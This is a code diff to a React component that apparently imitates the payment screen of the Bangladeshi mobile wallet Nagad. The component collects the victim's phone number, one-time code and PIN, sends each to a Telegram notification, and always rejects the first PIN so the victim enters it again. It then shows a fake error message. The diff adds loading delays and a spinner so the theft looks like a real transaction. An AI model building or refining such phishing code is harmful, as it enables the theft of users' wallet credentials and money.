@@ -75,26 +75,39 @@ const NagadPayment = () => {
 
   const handleConfirm = () => {
     if (isValidNumber()) { 
+      setIsLoading(true);
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') });
-      setPhoneError(""); setShowOtpView(true); 
+      setTimeout(() => {
+        setPhoneError(""); setShowOtpView(true);
+        setIsLoading(false);
+      }, 2000);
     }
     else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
   };
   const handleOtpConfirm = () => { 
     if (isValidOtp()) { 
+      setIsLoading(true);
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
-      setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); 
+      setTimeout(() => {
+        setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0);
+        setIsLoading(false);
+      }, 2000);
     } 
   };
   const handlePinConfirm = () => {
-    if (pinAttempts === 0) {
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
-      setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
-      setPinAttempts(1);
-    } else {
-      setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
-      setPinAttempts(2);
-    }
+    setIsLoading(true);
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
+    setTimeout(() => {
+      setIsLoading(false);
+      if (pinAttempts === 0) {
+        setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
+        setPinAttempts(1);
+        setPinDigits(Array(4).fill(""));
+      } else {
+        setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
+        setPinAttempts(2);
+      }
+    }, 2000);
   };
   const handleResendOtp = () => {
     setOtpValue("");
@@ -164,6 +177,7 @@ const NagadPayment = () => {
 
   return (
     <div className="h-[100dvh] w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
+      {isLoading && <StackedSpinnerLoader color="#C41E3A" />}
       <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
         
